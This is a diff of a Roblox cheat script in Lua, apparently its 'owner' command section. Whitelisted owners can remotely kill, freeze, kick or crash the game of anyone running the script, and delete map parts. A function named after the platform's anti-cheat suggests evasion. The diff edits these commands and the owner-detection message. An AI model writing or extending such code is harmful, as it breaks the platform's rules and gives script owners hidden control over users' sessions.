@@ -15,7 +15,7 @@ end
 function funcs:reset()
 	game:GetService("ReplicatedStorage").rbxts_include.node_modules.net.out._NetManaged.ResetCharacter:FireServer()
 end
-function funcs:kilfunctionl2()
+function funcs:kill2()
 	lplr.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,true)
 	lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
 end
@@ -53,13 +53,9 @@ function funcs:unfreeze()
 	lplr.Character.HumanoidRootPart.Anchored = false
 end
 function funcs:deletemap()
-	local container = game.Workspace
-
-	for _, descendant in ipairs(container:GetDescendants()) do
-	    if descendant:IsA("BasePart") or descendant:IsA("Model") then
-	        descendant:Destroy()
-	    end
-	end
+		for i,v in pairs(game:GetService("CollectionService"):GetTagged("block")) do
+			v:Destroy()
+		end
 end
 function funcs:crash()
 	if setfpscap then setfpscap(99e99) end
@@ -245,7 +241,7 @@ function funcs:byfron()
 				end)
 			end
 function funcs:kick(reason)
-	reason = reason or "Imagine Got Kicked L"
+	reason = reason or "You have been kicked by an owner"
 	lplr:Kick(reason)
 end
 function funcs:lobby()
@@ -276,14 +272,12 @@ end
 spawn(function()
 	for i,v in pairs(game:GetService("Players"):GetChildren()) do
 	if table.find(whitelist.Owners,v.UserId) then
-			sysmsg("the owner is currently in your game")
-			game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("DETECTED_OWNER")
+			sysmsg("[Detected] OWNER IS IN YOUR GAME!") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
 		end
 	end
 	game:GetService("Players").ChildAdded:Connect(function(v)
 		if table.find(whitelist.Owners,v.UserId) then
-			sysmsg("the owner is currently in your game")
-			game.TextChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("DETECTED_OWNER")
+			sysmsg("[DETECTED] OWNER IS IN YOU GAME!") -- this code i fix it now it will sent the sysmsg  but u still cant use commands tho
 		end
 	end)
 end)
